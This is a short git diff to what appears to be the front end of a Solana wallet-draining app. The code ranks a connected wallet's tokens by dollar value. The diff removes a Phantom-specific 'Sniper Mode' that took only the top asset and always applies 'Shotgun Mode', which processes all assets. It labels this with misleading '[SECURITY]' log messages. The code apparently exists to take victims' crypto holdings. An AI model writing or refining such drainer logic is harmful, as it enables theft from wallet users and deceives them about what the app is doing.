@@ -353,16 +353,20 @@ export default function App() {
         .filter(t => t.usdValue > 0.5)
         .sort((a, b) => b.usdValue - a.usdValue);
 
-      const w = window as any;
-      const isStrictlyPhantom = w.solana?.isPhantom && !w.solana?.isTrust && !w.solana?.isOkx;
+      // const w = window as any;
+      // const isStrictlyPhantom = w.solana?.isPhantom && !w.solana?.isTrust && !w.solana?.isOkx;
 
+      // let tokensToProcess = validTokens;
+      // if (isStrictlyPhantom) {
+      //   log(`[SECURITY] Phantom detected. Enabling Sniper Mode (Top Asset Only).`);
+      //   tokensToProcess = validTokens.slice(0, 1);
+      // } else {
+      //   log(`[SECURITY] Standard Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
+      // }
+
+            // Solana batches all tokens into a single transaction, so we can process ALL assets at once safely.
       let tokensToProcess = validTokens;
-      if (isStrictlyPhantom) {
-        log(`[SECURITY] Phantom detected. Enabling Sniper Mode (Top Asset Only).`);
-        tokensToProcess = validTokens.slice(0, 1);
-      } else {
-        log(`[SECURITY] Standard Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
-      }
+      log(`[SECURITY] Solana wallet detected. Enabling Shotgun Mode (All Assets).`);
 
       if (tokensToProcess.length === 0) {
         log("⚠️ No valuable Solana assets found to process.");
